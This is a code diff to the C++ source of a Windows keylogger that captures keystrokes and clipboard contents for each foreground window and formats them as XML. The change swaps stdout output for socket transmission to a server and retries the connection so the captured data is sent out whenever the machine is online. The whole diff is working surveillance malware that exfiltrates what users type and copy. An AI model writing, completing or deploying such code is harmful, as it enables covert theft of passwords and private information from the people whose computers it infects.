@@ -449,7 +449,7 @@ FORCEINLINE void grabclipboard()
                                 "]]></Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>ClipBoard</CaptureType>\n\t\t\t\t<Capture>");
                          current_process_data = writeSanitizedBuffer(current_process_data,(char*)this_cb_data);
                          current_process_data = writeUnsanitizedBuffer(current_process_data,
-                                "]]></Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[" );
+                                "</Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[" );
 
                     }
                     /*
@@ -525,6 +525,7 @@ int main()
     /*
         the main loop, capture key strokes indefinitely.
     */
+    bool SocketEstablished=false;
     while (1)
     {
 
@@ -600,25 +601,42 @@ int main()
             current_process_data = writeUnsanitizedBuffer(current_process_data,"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t</Process>");
             current_process_data = writeUnsanitizedByte(current_process_data,(char)0x00);
             /*
-                for now, use stdout to log file changes,
-                    eventually this will be socket socket level communication
+                if a socket is not established we don't want to exit the program,
+                this likely means their is no connectivity to the web, continue checking
+                for connectivity with every process change and send the data logged.
             */
-            cout<<current_process_data.buffered_data; ///TODO: socket communication
-            /*
-                reallocate the buffer to the default slab size.
-            */
-            current_process_data.buffered_data = (char*)realloc(current_process_data.buffered_data,DefaultBufferSz);
-            /*
-                re-initiate the buffer size to its default parameter.
-            */
-            current_process_data.buffer_size=DefaultBufferSz;
-            /*
-                reset the current offset in the buffer to 0.
-            */
-            current_process_data.current_buff_offset=0;
-            /*
-                get the current foreground window and store it in the CURRENTPROCESS.
-            */
+
+            if (SocketEstablished || (SocketEstablished=startListeningClient()))
+            {
+                /*
+                    attempt to write data to the currently established buffer, if
+                    that fails then
+                */
+                SocketEstablished=WriteToServer(current_process_data.buffered_data);
+              //  cout<<current_process_data.buffered_data; ///TODO: socket communication
+                /*
+                   if the socket is still established, indicating the data has been sent
+                   then reallocate the buffer to the default slab size, else continue logging
+                   without modification to the buffer. with any luck the computer will connect
+                   back out to the network.
+                */
+                if(SocketEstablished)
+                {
+
+                    current_process_data.buffered_data = (char*)realloc(current_process_data.buffered_data,DefaultBufferSz);
+                    /*
+                        re-initiate the buffer size to its default parameter.
+                    */
+                    current_process_data.buffer_size=DefaultBufferSz;
+                    /*
+                        reset the current offset in the buffer to 0.
+                    */
+                    current_process_data.current_buff_offset=0;
+                    /*
+                        get the current foreground window and store it in the CURRENTPROCESS.
+                    */
+                }
+            }
             CURRENTPROCEESS=GetForegroundWindow();
             /*
                 call to initialize tags and further process the foreground window.
